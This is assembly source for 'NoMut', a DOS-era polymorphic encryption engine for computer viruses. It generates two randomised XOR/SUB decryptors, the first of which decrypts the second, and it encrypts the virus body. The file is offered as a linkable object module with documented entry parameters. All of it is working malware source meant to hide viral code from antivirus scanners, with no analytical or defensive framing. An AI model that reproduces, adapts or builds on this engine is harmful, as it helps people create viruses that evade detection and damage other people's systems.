;
;NoMut Version 0.01
;
;NoMut is a polymorphic engine like every other one with two major
;differences:
;        1. It doesn't generate junk instructions.
;        2. It generates two decryptors where the first
;           decrypts the second one.
;
;NoMut is utilised as an object file.  You can use following public symbols:
;- mutate : near    The work horse.
;- mylen  : offset  The size of the engine code.
;
;Mutate needs the following call parameters:
;        DS:SI   Pointer to the unencrypted code.
;        CX      Size of the unencrypted code.
;        BP      Offset the decryptor should work on later.
;        ES      Work segment.
;The decryptor is always created at ES:0.
;Mutate only produces this output:
;        CX      Size of encrypted code including decryptors.
;
;NoMut must always be run at the offset that is specified upon compilation.
;

.model small
.code

public mutate
public mylen

adr_reg         db      3,6,7           ; bx, si, di
adr2_reg        db      7,4,5
reg_1           dw      0
begin           dw      ?
count           dw      ?
addres1         dw      ?
addres2         dw      ?
cond_jmp        dw      ?
fix             dw      ?
loop_beg        dw      ?
code_ptr        dw      ?,?
e_val1          db      ?
e_met1          db      ?
e_val2          db      ?
e_met2          db      ?

extrn   random:near

; Input: DS:SI Code to crypt
;        CX size of code to crypt
;        BP running offset of decryptor
;        ES working segment
mutate:
assume  ds:nothing
	; save params
	mov     code_ptr,si
	mov     code_ptr+2,ds
assume  ds:dgroup
	push    cs
	pop     ds
	mov     count,cx
	mov     begin,bp
	; generate randoms
	mov     ah,2
	call    random
	mov     byte ptr reg_1,al
	mov     ah,0feh
	call    random
	inc     al
	mov     e_val1,al
	mov     ah,1h
	call    random
	inc     al
	mov     e_met1,al
	xor     di,di
	call    generate
;       mov     bx,addres1
;       add     word ptr es:[bx],di
	mov     bx,addres2
	add     word ptr es:[bx],di
	mov     bx,fix
	sub     word ptr es:[bx],di
	add     begin,di
	push    di
	mov     al,e_val1
	mov     e_val2,al
	mov     al,e_met1
	mov     e_met2,al
retry_e:
	mov     ah,0feh
	call    random
	inc     al
	cmp     al,e_val2
	je      retry_e
	mov     e_val1,al
	mov     ah,1h
	call    random
	mov     e_met1,al
	call    generate
	pop     bx
	cld
assume  ds:nothing
	; crypt second decryptor
	push    di
	mov     ax,es
	mov     ds,ax
	mov     cx,di
	mov     di,bx
	mov     si,di
	sub     cx,di
	mov     ah,e_val2
encr_l1:
	lodsb
	cmp     e_met2,1
	jz      add_1
	xor     al,ah
	jmp     done_1
add_1:
	sub     al,ah
done_1:
	stosb
	loop    encr_l1
	pop     di
	; crypt virus
	lds     si,dword ptr code_ptr
	mov     cx,count
	mov     bl,e_val2
	xor     bh,e_val1
encr_loop:
	lodsb
	cmp     e_met1,1
	jz      add_2
	xor     al,bh
	jmp     done_2
add_2:
	sub     al,bh
done_2:
	cmp     e_met2,1
	jz      add_3
	xor     al,bl
	jmp     done_3
add_3:
	sub     al,bl
done_3:
	stosb
	loop    encr_loop

	mov     cx,di
	ret

generate:
	; generate address init
	mov     bx,reg_1
	cld
	mov     al,0B8h
	or      al,adr_reg[bx]
	stosb
	mov     addres1,di
	add     di,2                    ; keep free
	; store loop_beg
	mov     loop_beg,di
	; generate address test
	mov     ax,0F881h
	or      ah,adr_reg[bx]
	stosw
	mov     addres2,di
	add     di,2                    ; keep free
	; generate JNE
	mov     al,75h
	stosb
	mov     cond_jmp,di
	inc     di                      ; keep free
	; generate fix
	mov     ax,8081h
	mov     bx,reg_1
	or      ah,adr2_reg[bx]
	stosw
	mov     fix,di
	add     di,4                    ; keep free
;       mov     al,53h
;       stosb
;       mov     ax,000BBh
;       stosw
;       mov     ax,0C601h
;       stosw
;       mov     ax,0C307h
;       stosw
;       mov     ax,0d3FFh
;       stosw
;       mov     al,5bh
;       stosb
	; generate Prefetch Queue-Cleaner
	mov     al,0EBh
	stosb
	mov     ax,9001h
	stosw
	; fix conditional jump
	mov     ax,di
	push    di
	mov     di,cond_jmp
	sub     ax,di
	dec     ax
	stosb
	pop     di

	; generate decoder
	; just XOR now
	mov     bx,reg_1
	mov     ax,3080h
	cmp     e_met1,1
	jnz     done_4
	mov     ah,00h
done_4:
	or      ah,adr2_reg[bx]
	stosw
	mov     al,e_val1
	stosb

	; generate increase address
	mov     al,40h
	or      al,adr_reg[bx]
	stosb
	; generate jump back
	mov     al,0E9h
	stosb
	mov     cx,di                   ; later used for inserting in fix
	mov     ax,loop_beg
	sub     ax,di
	dec     ax
	dec     ax
	stosw
	; save pos right after decryptor
	push    di
	; fix the fix
;       mov     ax,cx
;       add     ax,bp
	mov     ax,cx
	sub     ax,count
	sub     ax,di
	mov     cx,di
	mov     di,fix
	stosw
	mov     ax,cx
	sub     ax,loop_beg
	stosw
	; fix address in adress init
	mov     di,addres1
	mov     ax,cx
	add     ax,bp
	stosw
	; fix address in compare
	mov     di,addres2
	add     ax,count
	stosw
	; restore pos after decryptor
	pop     di
	ret


mylen:

end
